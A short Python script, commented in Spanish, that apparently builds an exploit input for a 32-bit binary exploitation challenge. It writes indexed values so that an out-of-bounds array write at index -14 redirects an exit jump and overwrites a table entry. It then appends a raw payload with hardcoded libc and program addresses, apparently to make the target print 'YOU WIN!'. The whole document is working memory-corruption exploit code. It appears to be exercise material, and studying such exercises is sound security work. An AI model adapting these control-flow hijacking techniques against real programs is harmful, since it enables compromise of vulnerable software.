from struct import pack, unpack
from numpy import int32

data = []
scanf = b"%s\x0a\x00YOU WIN!\n\0"

for i in range(0, len(scanf), 4):
  asd = scanf[i:i+4]
  x = int.from_bytes(asd, 'little')
  data.append((i//4, int32(x)))

# Ahora voy a cambiar el exit
direccion_salto_exit = 0x08048493
direccion_salto_exit_pero_en_el_main = 0x080484b1
direccion_tabla = 0x804a040

# direccion_de_puts = 0xb7eecc10
direccion_de_printf = 0xf7e010a0

data.append((-14, direccion_salto_exit))

# Cargar el EDX mientras invoco EXIT

data.append((1024, direccion_tabla))

f = open('asd', 'w+')
for x in data:
  f.write(str(x[0]) + ' ' + str(x[1]) + '\n')
f.close()

f = open('asd', 'ab+')
# 0xf7e010a0
# 0x080484d9
f.write(b'BBBBCCCC\xa0\x10\xe0\xf7' + b'\x50\x3e\xde\xf7' + b'\x44\xa0\x04\x08' + b'\x48\xa0\x04\x08' + b'\x0a')
